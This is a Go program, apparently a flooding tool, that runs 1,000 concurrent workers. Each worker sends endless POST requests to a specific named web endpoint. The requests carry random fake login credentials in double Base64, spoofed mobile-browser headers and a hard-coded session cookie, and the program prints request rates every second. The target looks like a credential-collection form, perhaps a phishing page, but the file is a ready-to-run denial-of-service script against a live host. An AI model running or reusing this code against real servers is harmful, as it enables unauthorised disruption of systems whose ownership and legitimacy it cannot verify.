package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math/rand"
	"net/http"
	"sync"
	"sync/atomic"
	"time"
)

// 配置
const (
	url         = "https://rb.ootits.com/app/data.php"
	userAgent   = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
	cookie      = "PHPSESSID=3a91640cc9491b1f01bb61496ca7938f"
	concurrency = 1000 // 并发数量
)

// 请求计数
var totalRequests uint64
var totalBytes uint64

func randomString(n int) string {
	letters := []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
	s := make([]rune, n)
	for i := range s {
		s[i] = letters[rand.Intn(len(letters))]
	}
	return string(s)
}

func makePayload() string {
	data := map[string]interface{}{
		"act": "sv",
		"data": map[string]string{
			"user": randomString(8),
			"pass": randomString(10),
		},
	}
	jsonBytes, _ := json.Marshal(data)
	// 双层 Base64
	encoded := base64.StdEncoding.EncodeToString([]byte(base64.StdEncoding.EncodeToString(jsonBytes)))
	return encoded
}

func sendPost(wg *sync.WaitGroup) {
	defer wg.Done()
	client := &http.Client{
		Timeout: 10 * time.Second,
	}
	for {
		payload := makePayload()
		form := fmt.Sprintf("sv=%s", payload)
		req, _ := http.NewRequest("POST", url, bytes.NewBufferString(form))
		req.Header.Set("User-Agent", userAgent)
		req.Header.Set("Accept", "*/*")
		req.Header.Set("X-Requested-With", "XMLHttpRequest")
		req.Header.Set("Sec-Fetch-Site", "same-origin")
		req.Header.Set("Sec-Fetch-Mode", "cors")
		req.Header.Set("Sec-Fetch-Dest", "empty")
		req.Header.Set("Referer", "https://rb.ootits.com/step_in/")
		req.Header.Set("Accept-Encoding", "gzip, deflate, br, zstd")
		req.Header.Set("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8")
		req.Header.Set("Cookie", cookie)
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		resp, err := client.Do(req)
		if err == nil {
			n, _ := resp.Body.Read(make([]byte, 1024)) // 读取部分数据计算流量
			atomic.AddUint64(&totalRequests, 1)
			atomic.AddUint64(&totalBytes, uint64(n))
			resp.Body.Close()
		} else {
			fmt.Println("请求错误:", err)
		}
	}
}

func main() {
	rand.Seed(time.Now().UnixNano())

	var wg sync.WaitGroup
	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go sendPost(&wg)
	}

	// 每秒输出统计
	ticker := time.NewTicker(1 * time.Second)
	go func() {
		var lastReq uint64
		var lastBytes uint64
		for range ticker.C {
			req := atomic.LoadUint64(&totalRequests)
			bytes := atomic.LoadUint64(&totalBytes)
			fmt.Printf("每秒请求数: %d, 每秒流量: %.2f KB\n", req-lastReq, float64(bytes-lastBytes)/1024)
			lastReq = req
			lastBytes = bytes
		}
	}()

	wg.Wait()
}

